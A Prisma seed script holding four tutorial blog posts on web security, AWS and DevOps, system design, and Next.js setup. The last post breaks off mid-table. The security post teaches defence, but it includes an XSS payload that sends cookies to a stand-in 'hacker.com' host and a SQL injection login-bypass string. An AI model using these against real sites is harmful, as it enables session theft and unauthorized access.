import "dotenv/config";
import { prisma } from "../lib/prisma";
import path from "path";

async function seedBlogs() {

  const blog1 = {
    title: "Deep-Dive: Web Security & Authentication Essentials",
    category: "Web Security",
    date: "2026-07-16",
    readTime: "8 min read",
    excerpt: "A high-impact interview preparation guide and cheat sheet covering modern web authentication (JWT, OAuth) and critical security vulnerabilities (CSRF, XSS, SQLi).",
    content: `This guide serves as a high-impact reference for technical interviews and production system design, focusing on web security, stateless authentication, and defense strategies.

---

### 1. JWT (JSON Web Token)
*   **Definition**: An open standard (RFC 7519) defining a compact, self-contained way to securely transmit claims between parties as a JSON object. Mainly used for stateless session management.
*   **Structure**: Composed of three parts separated by dots (\`.\`): \`Header.Payload.Signature\`
    *   **Header**: Specifies the hashing algorithm (e.g., HS256) and token type.
    *   **Payload**: Contains claims—statements about the user (e.g., \`userId\`, \`roles\`, \`exp\`).
    *   **Signature**: Created by signing the encoded header and payload using a secret key to prevent tampering.
*   **Analogy**: A concert ticket with a digital barcode. The server doesn't need to look you up in a database for every purchase; it just scans the ticket's signature to verify validity.
*   **Key Interview Takeaway**: Statelessness. The server does not store session state in memory, enabling excellent scalability for distributed systems.

#### Code Snippet (Node.js - Signing and Verifying)
\`\`\`javascript
const jwt = require('jsonwebtoken');

// Payload containing user data
const payload = { userId: '12345', role: 'admin' };
const secretKey = 'my_super_secure_secret_key';

// Sign the token with a 1-hour expiration
const token = jwt.sign(payload, secretKey, { expiresIn: '1h' });
console.log('Generated JWT:', token);

// Verify the token
try {
  const decoded = jwt.verify(token, secretKey);
  console.log('Decoded Payload:', decoded);
} catch (err) {
  console.error('Invalid token:', err.message);
}
\`\`\`

---

### 2. OAuth (Open Authorization)
*   **Definition**: An open-standard authorization framework that allows third-party applications to obtain limited access to user data on another service (e.g., Google, GitHub) without exposing user passwords.
*   **Analogy**: A valet key. You don't give the valet your house keys or account password; you give them a restricted physical key that only permits driving the car a short distance and opening the trunk.
*   **Key Takeaway**: OAuth is for **Authorization** (granting permissions/access tokens), not **Authentication** (identifying who you are). OpenID Connect (OIDC) is built on top of OAuth 2.0 to handle authentication.

#### Exchange Authorization Code for Access Token
\`\`\`bash
# Requesting access token from the Authorization Server
curl -X POST https://oauth2.googleapis.com/token \\
  -d code=AUTHORIZATION_CODE_FROM_CALLBACK \\
  -d client_id=YOUR_CLIENT_ID \\
  -d client_secret=YOUR_CLIENT_SECRET \\
  -d redirect_uri=YOUR_REDIRECT_URI \\
  -d grant_type=authorization_code
\`\`\`

---

### 3. CSRF (Cross-Site Request Forgery)
*   **Definition**: A vulnerability where an attacker tricks an authenticated browser into submitting unauthorized requests to a trusted destination.
*   **How it Works**: Browsers automatically attach cookies (including active session identifiers) to all HTTP requests sent to a domain. If you are logged into your bank and click a malicious link in another browser tab, the malicious site can submit a hidden form to your bank, which your browser will authorize with your credentials.
*   **Analogy**: An attacker stealing your physical notary stamp and stamping a fake contract while you are looking away.
*   **Prevention**: Enforce Anti-CSRF Tokens (unique, unpredictable tokens validated on the server for all mutating requests) and set cookie attributes to \`SameSite=Strict\` or \`Lax\`.

#### Anti-CSRF Validation in Express
\`\`\`javascript
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());
const csrfProtection = csrf({ cookie: true });

// Route to render form - generates and sends token to the client
app.get('/form', csrfProtection, (req, res) => {
  res.send(\`<form action="/process" method="POST">
              <input type="hidden" name="_csrf" value="\${req.csrfToken()}">
              <button type="submit">Submit Data</button>
            </form>\`);
});

// Route to handle POST - automatically validates CSRF token
app.post('/process', csrfProtection, (req, res) => {
  res.send('Data processed securely!');
});
\`\`\`

---

### 4. XSS (Cross-Site Scripting)
*   **Definition**: An vulnerability where malicious client-side scripts (usually JavaScript) are injected into trusted web applications and executed in the client's browser.
*   **Types**:
    *   **Stored XSS**: Malicious script is permanently stored on the server (e.g., comment database) and served to other visitors.
    *   **Reflected XSS**: Script is part of the request payload (e.g., query params) and reflected back instantly in the response page.
*   **Analogy**: Writing a hypnotic spell on a public bulletin board. Anyone who reads it obeys the spell's commands.
*   **Prevention**: Sanitize user inputs, contextually encode outputs (e.g., converting \`<\` to \`&lt;\`), and configure a strict Content Security Policy (CSP).

#### HTML Output Escaping
\`\`\`javascript
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, function(match) {
    const escapeMap = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;'
    };
    return escapeMap[match];
  });
}

const maliciousInput = "<script>fetch('hacker.com/steal?cookie=' + document.cookie)</script>";
const safeOutput = escapeHTML(maliciousInput);
console.log(safeOutput); 
// Output: &lt;script&gt;fetch('hacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;
// (Renders safely as plain text in the browser instead of executing)
\`\`\`

---

### 5. SQL Injection (SQLi)
*   **Definition**: An attack vector where SQL commands are injected into user inputs to manipulate backend database queries.
*   **Analogy**: Telling a bank teller, "Please deposit this check. Oh, and by the way, transfer all remaining vaults funds to my account."
*   **Prevention**: Use Parameterized Queries (Prepared Statements) or standard ORMs (like Prisma or Hibernate) which parameterize queries by default.

#### Vulnerable vs. Secure Database Queries
\`\`\`javascript
const { Client } = require('pg');
const client = new Client();

// VULNERABLE: Direct string concatenation
const unsafeQuery = \`SELECT * FROM users WHERE username = '\${req.body.username}' AND password = '\${req.body.password}'\`;
// If username is: admin' OR '1'='1 -- it bypasses authentication entirely.

// SECURE: Parameterized Query
const safeQuery = 'SELECT * FROM users WHERE username = $1 AND password = $2';
const values = [req.body.username, req.body.password];

client.query(safeQuery, values)
  .then(res => console.log('User authenticated safely'))
  .catch(err => console.error(err.stack));
\`\`\`
`
  };

  const blog2 = {
    title: "AWS Cloud Infrastructure & DevOps Study Guide",
    category: "Cloud & DevOps",
    date: "2026-07-16",
    readTime: "12 min read",
    excerpt: "A comprehensive cheat sheet and roadmap for AWS Cloud computing, Docker/Kubernetes container orchestration, Infrastructure as Code (Terraform), and DevOps deployment strategies.",
    content: `This guide compiles high-frequency cloud and DevOps infrastructure concepts, mapping AWS service abstractions, CLI syntax patterns, and cloud-native choices.

---

### 1. EC2 (Elastic Compute Cloud)
*   **Definition**: Scalable virtual machines in the AWS cloud (Infrastructure as a Service - IaaS).
*   **Takeaway**: Provides raw computing capacity. You maintain full OS-level control and are responsible for kernel patches, updates, firewall ports, and system configurations.

#### AWS CLI - EC2 Operations
\`\`\`bash
# List all running EC2 instances in your configured region
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running"

# Start an EC2 instance
aws ec2 start-instances --instance-ids i-0123456789abcdef0

# Stop an EC2 instance
aws ec2 stop-instances --instance-ids i-0123456789abcdef0
\`\`\`

---

### 2. Lambda (FaaS)
*   **Definition**: Serverless compute service (Function as a Service) that runs code in response to events and scales automatically.
*   **Takeaway**: Zero server provisioning or management. You pay only for compute time consumed per millisecond of execution. Maximum execution timeout is hard-capped at 15 minutes.

#### Python Lambda Handler & AWS CLI Invocation
\`\`\`python
# lambda_function.py
import json

def lambda_handler(event, context):
    print("Received event: " + json.dumps(event))
    name = event.get('name', 'World')
    return {
        'statusCode': 200,
        'body': json.dumps(f'Hello, {name}!')
    }
\`\`\`
\`\`\`bash
# Invoke Lambda function remotely via AWS CLI and save output
aws lambda invoke \\
  --function-name my-hello-function \\
  --payload '{"name": "Safir"}' \\
  response.json
\`\`\`

---

### 3. Container Orchestration: ECS vs. EKS
*   **ECS (Elastic Container Service)**: AWS-proprietary container orchestrator. Easy configuration, deeply integrated with IAM, CloudWatch, and ALB.
*   **EKS (Elastic Kubernetes Service)**: AWS-managed Kubernetes. Highly portable, open-source standard, but introduces more operational complexity.
*   **Analogy**: ECS is like iOS (simple, seamless inside the ecosystem). EKS is like custom Android (infinite configuration options, but you manage the orchestration overhead).

#### Docker and Kubernetes Commands
\`\`\`bash
# Build and tag a container image
docker build -t my-app:latest .

# List production Kubernetes pods using kubectl
kubectl get pods -n production

# Describe details of an ECS Service
aws ecs describe-services --cluster my-cluster --services my-service
\`\`\`

---

### 4. Cloud Storage: S3 vs. EBS
*   **S3 (Simple Storage Service)**: Object storage designed for web-scale access. Infinite capacity, accessible via HTTP/API, extremely cheap. Best for assets, backups, and logs.
*   **EBS (Elastic Block Store)**: Block storage. Virtual SSD/HDD attached directly to a single EC2 instance. Best for active operating systems and transactional databases.
*   **Analogy**: S3 is like Dropbox (upload files, share URLs). EBS is the physical SSD plugged into your computer's motherboard.

#### CLI Interactions
\`\`\`bash
# Upload a file to an S3 object store
aws s3 cp localfile.txt s3://my-unique-bucket-name/backup/

# List block devices on a Linux EC2 instance to check EBS mount status
lsblk
\`\`\`

---

### 5. Managed Databases: RDS vs. DynamoDB
*   **RDS**: Managed relational SQL service (supporting PostgreSQL, MySQL, SQL Server). Best for structured schemas, complex SQL queries, and ACID transactions.
*   **DynamoDB**: Serverless, fully managed NoSQL key-value database. Delivers single-digit millisecond latency at any scale.

#### Python Boto3 - Writing to DynamoDB
\`\`\`python
import boto3

# Initialize DynamoDB client resource
dynamodb = boto3.resource('dynamodb', region_name='eu-north-1')
table = dynamodb.Table('UsersTable')

# Insert item
table.put_item(
   Item={
        'userId': '12345',
        'username': 'safir_jameel',
        'email': 'safir.jameel@gmail.com',
        'status': 'Active'
    }
)
print("Item inserted successfully.")
\`\`\`

---

### 6. Infrastructure as Code (IaC): CloudFormation vs. Terraform
*   **CloudFormation**: AWS-native declarative JSON/YAML infrastructure modeling tool.
*   **Terraform**: Open-source, cloud-agnostic declarative engine developed by HashiCorp using HCL (HashiCorp Configuration Language).

#### Terraform Configuration & CLI Workflow
\`\`\`hcl
# main.tf
provider "aws" {
  region = "eu-north-1"
}

resource "aws_instance" "web_server" {
  ami           = "ami-0123456789abcdef0"
  instance_type = "t3.micro"
  tags = {
    Name = "Terraform-Web-Server"
  }
}
\`\`\`
\`\`\`bash
# Initialize Terraform workspace
terraform init

# Generate and view execution plans
terraform plan

# Apply infrastructure configurations
terraform apply -auto-approve
\`\`\`

---

### 7. AI/ML on AWS: SageMaker vs. Bedrock
*   **SageMaker**: Complete ML platform to build, train, evaluate, and host custom machine learning models.
*   **Bedrock**: Serverless API access to pre-trained Foundation Models (e.g., Anthropic Claude, Meta Llama, Cohere Command).
*   **Analogy**: SageMaker is buying raw lumber to craft a custom desk. Bedrock is buying pre-fabricated pieces from IKEA and putting them to work immediately.

#### Python Boto3 - Invoking Claude on Bedrock
\`\`\`python
import boto3
import json

bedrock_client = boto3.client('bedrock-runtime', region_name='us-east-1')
prompt = "Explain RAG (Retrieval-Augmented Generation) in one sentence."

body = json.dumps({
    "prompt": f"\\n\\nHuman: {prompt}\\n\\nAssistant:",
    "max_tokens_to_sample": 100
})

response = bedrock_client.invoke_model(
    modelId="anthropic.claude-v2",
    body=body
)

response_body = json.loads(response.get('body').read())
print(response_body.get('completion'))
\`\`\`

---

### 8. Pub/Sub vs. Queuing: SNS vs. SQS
*   **SNS (Simple Notification Service)**: Pub/Sub message hub. Push-based. Instantly fans out a message to multiple subscribing endpoints (HTTP, Lambda, SQS, Email).
*   **SQS (Simple Queue Service)**: Message queuing service. Pull-based. Decouples distributed services by buffer-holding messages until workers pull and process them.
*   **Analogy**: SNS is a radio station broadcasting live. SQS is a post office box holding letters until you drop by to collect them.

#### AWS CLI - SNS/SQS Operations
\`\`\`bash
# Publish message to an SNS topic
aws sns publish \\
  --topic-arn arn:aws:sns:eu-north-1:123456789012:MyTopic \\
  --message "Deployment succeeded"

# Receive/Pull message from SQS Queue
aws sqs receive-message \\
  --queue-url https://sqs.eu-north-1.amazonaws.com/123456789012/MyQueue
\`\`\`

---

### 9. Firewall Layers: Security Group vs. NACL
*   **Security Group**: Firewall rules applied at the **Instance** level. Stateful (Inbound responses are automatically allowed outbound). Supports "Allow" rules only.
*   **Network ACL (NACL)**: Firewall rules applied at the **Subnet** boundary. Stateless (Requires writing separate rules for both inbound and outbound traffic). Supports "Allow" and "Deny" rules.

#### AWS CLI - Security Group Config
\`\`\`bash
# Authorize inbound port 80 (HTTP) on a Security Group
aws ec2 authorize-security-group-ingress \\
  --group-id sg-0123456789abcdef0 \\
  --protocol tcp \\
  --port 80 \\
  --cidr 0.0.0.0/0
\`\`\`

---

### 10. CI/CD Lifecycle: From git push to Production
The journey of a code change follows this sequence:

*   **Continuous Integration (CI)**:
    *   **Trigger**: A developer pushes code to \`main\` or opens a Pull Request.
    *   **Setup**: The pipeline spins up a clean, isolated container (e.g., Ubuntu).
    *   **Install & Lint**: Runs \`npm ci\` and \`eslint\` to ensure standard dependencies and clean code styling.
    *   **Test**: Executes all unit and integration tests (\`npm run test\`).
    *   **Build**: Compiles the project (e.g., \`npm run build\` or packages a Docker container).
*   **Continuous Delivery/Deployment (CD)**:
    *   **Deploy to Staging**: Injects staging variables and deploys code to a test/staging environment.
    *   **Integration Tests**: Automated end-to-end tests (like Cypress) run against the live staging URL.
    *   **Deploy to Production**: Promotes/swaps the build to the live server (using Blue-Green deployment or serverless CDNs like Vercel).

---

### 11. DevSecOps: Security Scanning
Security (DevSecOps) is executed at different stages of the lifecycle to prevent vulnerabilities from reaching production:

| Security Type | Where It Runs | Tools Used | What It Does |
| :--- | :--- | :--- | :--- |
| **SCA** (Software Composition Analysis) | **CI Phase (Early)** - Right after dependencies are installed. | \`npm audit\`, \`Snyk\` | Scans third-party libraries (\`package.json\`) for known security flaws. |
| **SAST** (Static Application Security Testing) | **CI Phase (Before Build)** - Analyzes the raw code. | \`SonarQube\`, \`GitHub CodeQL\` | Scans raw source code for code smells, SQL injection entry points, or hardcoded secrets. |
| **Container Scanning** | **CI Phase (Post-Build)** - Right after creating a Docker image. | \`Trivy\`, \`Anchore\` | Scans the container's base operating system files for OS-level vulnerabilities. |
| **DAST** (Dynamic Application Security Testing) | **Post-Deploy (Staging)** - Scans the active running website. | \`OWASP ZAP\` | Simulates active hacker attacks (like XSS or SQLi) against the live staging application. |

---

### 12. Secret Management: Storing Secrets, Passwords, and API Keys
*   **Rule #1**: Never commit secrets to Git.
*   **CI/CD Pipeline Secrets**: Store in GitHub Secrets or Jenkins Credentials. They are injected as encrypted environment variables in the repository settings page and accessed during build time via \`\${{ secrets.SUPABASE_API_KEY }}\`.
*   **Enterprise Cloud Secrets Managers**: Use HashiCorp Vault, AWS Secrets Manager, or Google Cloud Secret Manager. The runner authenticates via IAM roles and fetches the secrets dynamically.
*   **OIDC (OpenID Connect)**: Modern pipelines do not store permanent credentials (like AWS Access Keys) in GitHub. Instead, they use OIDC to request short-lived, temporary access tokens from AWS during the build run.

---

### 13. Rollback Strategies: Handling Deployment Failures
If a live deployment fails, the goal is to return to a working state instantly with zero downtime:

1.  **Instant CDN/DNS Rollback (Vercel/Netlify)**:
    *   Vercel keeps a history of your previous successful builds. If a deployment fails, you click "Rollback" (or trigger it via API). Vercel instantly routes your domain to point to the previous successful build hash. This takes 1 second and requires no code compiling.
2.  **Blue-Green Deployments (AWS/Docker/Kubernetes)**:
    *   You maintain two environments: **Blue** (current live version) and **Green** (new deployment).
    *   You deploy the new version to Green. A load balancer runs health checks. If Green fails health checks, traffic is kept on Blue. The user never notices a crash.
3.  **Database Migration Safety**:
    *   Migrations must be backward compatible. Never delete database columns during a new deployment. Instead, add columns first, deploy the code, verify, and then delete old columns in a subsequent release. This allows you to roll back code without breaking the database.

---

### 14. Real-World Interview Case Study: Cache Corruption
*   **The Problem**: Corrupted dependency caching leading to build failures.
*   **Situation**: We cached \`node_modules\` in our GitHub Actions pipeline to speed up the builds. However, when a developer updated a package version (e.g. from 1.1.0 to 1.2.0), the CI server kept using the old cached \`node_modules\` folder, causing compile errors in production like "Module not found" or typing mismatches.
*   **The Resolution**:
    1.  **Cache Key Hashing**: We updated the cache action key to hash the lockfile: \`key: npm-\${{ hashFiles('package-lock.json') }}\`. If the lockfile changes, the cache is instantly invalidated, forcing a clean download.
    2.  **Enforced Clean Installs**: We replaced \`npm install\` with \`npm ci\` in our pipeline. \`npm ci\` is designed specifically for CI servers: it deletes the local \`node_modules\` folder first, verifies the lockfile matches the \`package.json\` exactly, and installs dependencies cleanly. This eliminated caching bugs completely.
`
  };

  const blog3 = {
    title: "System Design & Network Architecture Essentials",
    category: "System Design",
    date: "2026-07-16",
    readTime: "10 min read",
    excerpt: "A comprehensive cheat sheet and roadmap for system design interviews, covering latency vs bandwidth, replication vs sharding, process vs thread, load balancers, and monolith vs microservices.",
    content: `This document serves as a high-impact study guide and cheat sheet for system design interviews, mapping core networking principles, execution models, database scaling strategies, and software architectures.

---

### 1. Network Performance: Bandwidth vs. Latency vs. Throughput

| Concept | What It Represents | Analogy | Real-World Example |
| :--- | :--- | :--- | :--- |
| **Bandwidth** | The maximum capacity of the network link. | The diameter of the water pipe. (A wider pipe has the capacity to hold more water at once). | A "100 Mbps" or "1 Gbps" internet connection. |
| **Latency** | The delay (travel time) for a single packet. | The length of the water pipe. (It takes time for the first drop of water to travel from reservoir to tap). | Your ping / round-trip time (e.g., 15ms ping to Supabase). |
| **Throughput** | The actual amount of data successfully delivered. | The flow rate of water coming out of the tap per second. | Your actual download speed (e.g., 85 Mbps on a 100 Mbps connection). |

#### Deep Dive into Each Concept
*   **Bandwidth (Potential Capacity)**: The theoretical maximum amount of data sent over a connection in one second. Having high bandwidth does not mean your site is fast. It just means your site can handle large files (like 4K video streams) or many concurrent users at once.
*   **Latency (Speed / Delay)**: The round-trip time (RTT) for a packet. If your server in Stockholm makes 10 database queries to load a page, and database latency is 150ms (because the database is in the US), the page will take at least **1.5 seconds** to load (10 x 150ms), regardless of bandwidth! This is why database region proximity to servers is vital.
*   **Throughput (Actual Performance)**: The actual speed of data transmission. Network congestion, high latency, server CPU load, and packet loss act like friction in the pipe, reducing the throughput relative to your bandwidth.

#### The Gaming & Web App Example
*   **High Bandwidth / High Latency**: Downloading a 10GB game. It doesn't matter if there's a 200ms delay before the download starts, as long as the download speed is fast (wide pipe).
*   **Low Bandwidth / Low Latency**: Online multiplayer gaming. The game only sends tiny packets of player coordinates (needs low bandwidth), but needs instant travel time (latency under 20ms) to prevent lag.
*   **Web Applications**: Needs low latency for database queries (for responsive UI/buttons) and high throughput during checkout surges (to process hundreds of concurrent orders).

---

### 2. Database Scalability: Replication vs. Sharding

| Strategy | How It Works | Library Analogy | When to Use It |
| :--- | :--- | :--- | :--- |
| **Replication** | Copying the database onto multiple servers. | Printing 10 copies of the dictionary and placing them in different rooms so 10 people look up words at once. | For **Read-Heavy** apps (e.g., e-commerce stores, news blogs) where many users read data, but few write. |
| **Sharding** | Splitting the database rows across multiple servers. | Tearing the dictionary in half (A–M in Room 1, N–Z in Room 2) because the book has grown too heavy for one table. | For **Write-Heavy** apps (e.g., Twitter, chat apps, payment logs) where the volume of data exceeds a single server's limits. |

#### Database Replication (Copying)
In a replicated setup, you have one Primary (Write) database server and multiple Secondary (Read) replicas:
\`\`\`text
                       [ Client App ]
                             │
                  ┌──────────┴──────────┐
           (Writes)                     (Reads)
                  ▼                     ▼
          [ Primary DB ] ──(Sync)──► [ Read Replica 1 ]
                                ──► [ Read Replica 2 ]
\`\`\`
*   **Workflow**: All inserts, updates, and deletes (writes) go to the Primary database. The Primary syncs these changes to the Read Replicas. Clients query/read data from the replicas.
*   **Pros**:
    *   **High Availability**: If the Primary database server crashes, a Read Replica is automatically promoted to be the new Primary (zero downtime).
    *   **Scalable Reads**: You can spin up multiple replicas to handle millions of visitors browsing your site.

#### Database Sharding (Horizontal Partitioning)
Sharding splits a single table's rows across different database instances using a Shard Key (like user ID or country):
\`\`\`text
                       [ Shard Router ]
                             │
         ┌───────────────────┼───────────────────┐
  (User A-M)              (User N-Z)          (User Log)
         ▼                   ▼                   ▼
    [ Shard 1 ]         [ Shard 2 ]         [ Shard 3 ]
   (DB Server 1)       (DB Server 2)       (DB Server 3)
\`\`\`
*   **Workflow**: Instead of storing all users in one table on one server, users with names starting with A–M are stored on Server 1, and N–Z are stored on Server 2.
*   **Pros**:
    *   **Scalable Writes**: Writes are divided among multiple database engines, bypasses single CPU/disk constraints.
    *   **Infinite Capacity**: Store petabytes of data by adding more shards.
*   **Cons**:
    *   **Complex Queries**: Queries spanning multiple ranges (e.g., searching for both A–M and N–Z users) require cross-server joins and merges, which is extremely slow.

---

### 3. Execution Models: Concurrency vs. Parallelism

| Concept | How It Works | Kitchen Analogy | Hardware Requirement |
| :--- | :--- | :--- | :--- |
| **Concurrency** | Managing and switching between multiple tasks over time. | One Chef chopping onions for a minute, then stirring the soup, then checking the oven. Doing one task at any exact second. | Can run on a single-core CPU by rapidly switching tasks. |
| **Parallelism** | Executing multiple tasks at the exact same instant. | Three Chefs working in the kitchen simultaneously. Chef A chops, Chef B stirs, and Chef C bakes at the same time. | Requires multi-core CPUs or multiple compute instances. |

*   **Concurrency (Structure & Interleaving)**: The ability of a system to handle multiple tasks by dividing them into independent sub-tasks and switching back and forth (context-switching) very quickly.
    *   *Node.js Context*: JavaScript is single-threaded. It achieves concurrency using the Event Loop. When your server makes a database query, JavaScript doesn't freeze; it puts that task on hold, handles a user button click, and comes back to the database result when it's ready.
*   **Parallelism (Simultaneous Execution)**: Doing multiple tasks at the exact same physical instant. This requires multiple processors (cores) working together.
    *   *Node.js Context*: Parallelism is used for heavy, CPU-bound computations (like video rendering, image processing, or training machine learning models). You split the image into 8 sections and let 8 CPU cores render their sections at the exact same time.

---

### 4. Real-time Communication: Polling vs. Webhooks

| Metric | Polling | Webhook |
| :--- | :--- | :--- |
| **Request Initiator** | Client | Server |
| **Communication Model** | Pull (Querying) | Push (Event-driven) |
| **Resource Efficiency** | Low (high waste) | High (zero waste) |
| **Real-time Accuracy** | Delayed (depends on the poll interval) | Instant (occurs the second the event happens) |
| **Setup Complexity** | Simple | More complex (requires route handlers & web security) |

#### Polling (Client-Driven / Pull)
In a polling setup, the client is in control. It periodically sends HTTP requests to the server at a regular interval (e.g., every 5 seconds).
\`\`\`text
  [ Client ] ────────── Is there new data? ──────────► [ Server ]
  [ Client ] ◄──────────── No. (200 OK) ───────────── [ Server ]
  
  (Wait 5 seconds...)
  
  [ Client ] ────────── Is there new data? ──────────► [ Server ]
  [ Client ] ◄───────── Yes! Here is the data ──────── [ Server ]
\`\`\`
*   **Pros**: Easy to write and implement on the frontend (e.g. using setInterval).
*   **Cons**: Wasteful. If data only updates once a day, your client will make thousands of useless HTTP requests, consuming server CPU and bandwidth.

#### Webhooks (Server-Driven / Push)
A Webhook (also called a "Reverse API") is event-driven. The client registers an API endpoint URL (a listener) on the server. When the server registers the event, it sends an HTTP POST request containing the data to the client's URL.
\`\`\`text
  [ Client ] ... (Sitting idle / waiting) ...         [ Server ]
  
  (Event happens: Customer completes payment)
  
  [ Client ] ◄───────── POST /api/stripe-webhook ───── [ Server ]
  [ Client ] ────────── Received! (200 OK) ──────────► [ Server ]
\`\`\`
*   **Pros**: Highly efficient. No resources are wasted. Communication only happens when actual work needs to be done.
*   **Cons**: You must expose a public URL endpoint (Vercel routes are perfect for this) and secure it with signature checks to prevent hackers from sending fake events.

---

### 5. OS Primitives: Process vs. Thread

| Feature | Process | Thread |
| :--- | :--- | :--- |
| **Definition** | An executing application. | A single task execution unit inside a process. |
| **Memory** | Isolated (each process has its own RAM). | Shared (threads share the parent process's RAM). |
| **Creation Cost** | High (expensive to create and switch). | Low (very fast and lightweight). |
| **Fault Tolerance** | High (one crash doesn't affect others). | Low (one thread crash kills the whole process). |

*   **Process**: A program in execution. When you double-click an application icon, the operating system starts a new process.
    *   *Memory Isolation*: The OS allocates a dedicated block of memory (RAM) to that process. This memory is protected; if Process A tries to read Process B's memory, the OS blocks it.
    *   *Crash Proof*: If a process crashes (e.g., a browser tab crashes), only that process dies. Your other tabs (which are separate processes) keep running safely.
*   **Thread**: A path of execution inside a process. A single process can spawn multiple threads to perform different tasks at the same time.
    *   *Shared Memory*: Because all threads belong to the same process, they share the exact same variables, memory heap, and database connection handles. This makes sharing data between threads extremely fast.
    *   *Thread Safety Risks*: Because threads share variables, if Thread 1 writes to a variable at the same millisecond that Thread 2 is reading it, you get data corruption (called a **Race Condition**). Developers must write locks to prevent this.

---

### 6. Traffic Management: Load Balancer vs. API Gateway

| Feature | Load Balancer | API Gateway |
| :--- | :--- | :--- |
| **Primary Goal** | Redundancy & keeping servers from crashing under load. | Security, routing, and traffic management for APIs. |
| **Intelligence** | Low (does not care what is inside the request packet). | High (inspects cookies, tokens, headers, and paths). |
| **Typical Protocols** | Layer 4 (TCP/UDP) or Layer 7 (HTTP). | Layer 7 (HTTP/REST, GraphQL, gRPC). |
| **Typical Tasks** | Health checks, round-robin routing, SSL offloading. | Authentication, Rate Limiting, API Routing, Caching. |

#### Load Balancer (The Traffic Cop)
A load balancer sits in front of your servers and distributes incoming network requests to multiple instances of the same service.
\`\`\`text
                               [ Incoming Traffic ]
                                        │
                                        ▼
                                 [ Load Balancer ]
                                  /     │     \
                             ┌───┘      │      └───┐
                             ▼          ▼          ▼
                        [Server 1]  [Server 2]  [Server 3]
\`\`\`
*   **Workflow**: It acts purely at the network level (TCP/HTTP) to distribute traffic. It checks server health and forwards requests using algorithms like Round Robin.

#### API Gateway (The Smart Entry Point)
An API gateway sits between the client (mobile app or browser) and your backend microservices. It is a reverse proxy that inspects the request headers, cookies, and tokens.
\`\`\`text
                               [ Client Requests ]
                                        │
                                        ▼
                                 [ API Gateway ]
                                  (Auth, Rate Limit)
                                  /     │     \
                             ┌───┘      │      └───┐
                      (Movies)          │          (Billing)
                             ▼          ▼          ▼
                        [Movie API] [Cart API] [Stripe API]
\`\`\`
*   **Workflow**: It acts at the application layer. It reads what the client wants and routes requests dynamically (e.g., \`/movies\` goes to Movie service, \`/checkout\` goes to Stripe). It also handles auth checks and rate limiting.

---

### 7. Software Architecture: Monolith vs. Microservices

| Metric | Monolith | Microservices |
| :--- | :--- | :--- |
| **Codebase** | One single repository. | Multiple separate repositories. |
| **Deployment** | Single deployment package. | Multiple independent deployments. |
| **Team Size** | Best for 1–10 developers. | Best for large organizations (100+ developers). |
| **Network Overhead** | Zero (local function calls). | High (constant API calls between servers). |
| **Startup Cost** | Low. | High. |

*   **Monolith**: The entire app (Auth, Database, Payments, Catalog) is built as a single, unified codebase.
    *   *Pros*: Simple development, fast transactions (everything uses the same database), and low hosting costs.
    *   *Cons*: Single Point of Failure (a bug in one module can crash the whole app), slow deployments as the codebase grows.
*   **Microservices**: The app is split into independent services that run on different servers, maintain their own databases, and communicate over the network.
    *   *Pros*: Technology freedom (different languages per service), independent scaling (scale up catalog without touching billing), and team autonomy.
    *   *Cons*: Extreme complexity (networking latency, network failures), distributed data consistency issues, and high hosting costs.
`
  };

  const blog4 = {
    title: "Building Next.js Applications from Scratch: A Developer's Handbook",
    category: "Next.js",
    date: "2026-07-16",
    readTime: "15 min read",
    excerpt: "A comprehensive, step-by-step roadmap to initializing, structuring, and deploying a Next.js (App Router) project from absolute scratch, covering routing, data fetching, and security.",
    content: `This guide serves as a practical, step-by-step blueprint for developers looking to initialize, construct, and deploy a robust Next.js application using the modern **App Router** paradigm.

---

### 1. Introduction: Why Next.js?
React is a powerful client-side library for rendering user interfaces, but it leaves framework architecture, routing, SEO, and server-side operations entirely up to the developer. Next.js is a production-grade full-stack framework built on top of React that introduces:
*   **Zero-Config Compilation**: Automated compiling, bundling (Webpack/Turbopack), and code splitting.
*   **Hybrid Rendering**: Server-Side Rendering (SSR), Static Site Generation (SSG), and Client-Side Hydration out of the box.
*   **Built-in Optimization**: Automated image size tuning, font loading, script caching, and SEO crawlers.

---

### 2. Initialization: Setting Up the Workspace

#### Method A: Automated Scaffolding (Recommended)
The fastest way to scaffold a Next.js project is running the interactive CLI script:
\`\`\`bash
npx create-next-app@latest my-app
\`\`\`
The setup script will ask for the following choices:
*   **TypeScript**: Yes (Enforces strict compiler checks and static typing).
*   **ESLint**: Yes (Maintains consistent code formatting and flags syntax warnings).
*   **Tailwind CSS**: Yes (For rapid, utility-first UI styling).
*   **src/ directory**: Yes (Keeps project configurations separated from core source code).
*   **App Router**: Yes (Enables the modern layout, nested routing, and Server Components).
*   **Import Alias**: \`@/*\` (Maps import routes starting from the root \`/src\` folder).

#### Method B: Manual Initialization
If you want to understand what goes on under the hood, you can bootstrap the application manually:

1. Create a new directory and initialize npm:
\`\`\`bash
mkdir manual-next-app && cd manual-next-app
npm init -y
\`\`\`

2. Install core React and Next.js dependencies:
\`\`\`bash
npm install next react react-dom
\`\`\`

3. Install development tooling (TypeScript & type definitions):
\`\`\`bash
npm install -D typescript @types/react @types/react-dom @types/node
\`\`\`

4. Configure package scripts in your \`package.json\`:
\`\`\`json
"scripts": {
  "dev": "next dev",
  "build": "next build",
  "start": "next start",
  "lint": "next lint"
}
\`\`\`

5. Initialize the Next.js directories:
\`\`\`bash
mkdir -p app
touch app/layout.tsx app/page.tsx
\`\`\`

---

### 3. File & Directory Conventions
The Next.js App Router relies on **file-based routing**. The folders inside the \`app\` directory define URL routes, and specific file names represent specific layouts or component behaviours:

*   **\`layout.tsx\`**: Defines UI shared across multiple pages (e.g., headers, footers, context providers). It wraps children and does not re-render during navigation.
*   **\`page.tsx\`**: Represents the unique visual content of the URL route.
*   **\`loading.tsx\`**: Renders fallback skeleton loaders using React Suspense during data fetches.
*   **\`error.tsx\`**: Defines error boundary fallbacks for runtime exceptions.
*   **\`not-found.tsx\`**: Renders default 404 response page when resources aren't found.
*   **\`route.ts\`**: Handles custom HTTP API methods (GET, POST, PUT, DELETE) rather than returning React components.

---

### 4. Core Concepts: App Router Architecture

#### Server Components (RSC) vs. Client Components
By default, **every component inside the App Router is a React Server Component (RSC)**.

| Feature | React Server Components (RSC) | Client Components (\`"use client"\`) |
| :--- | :--- | :--- |
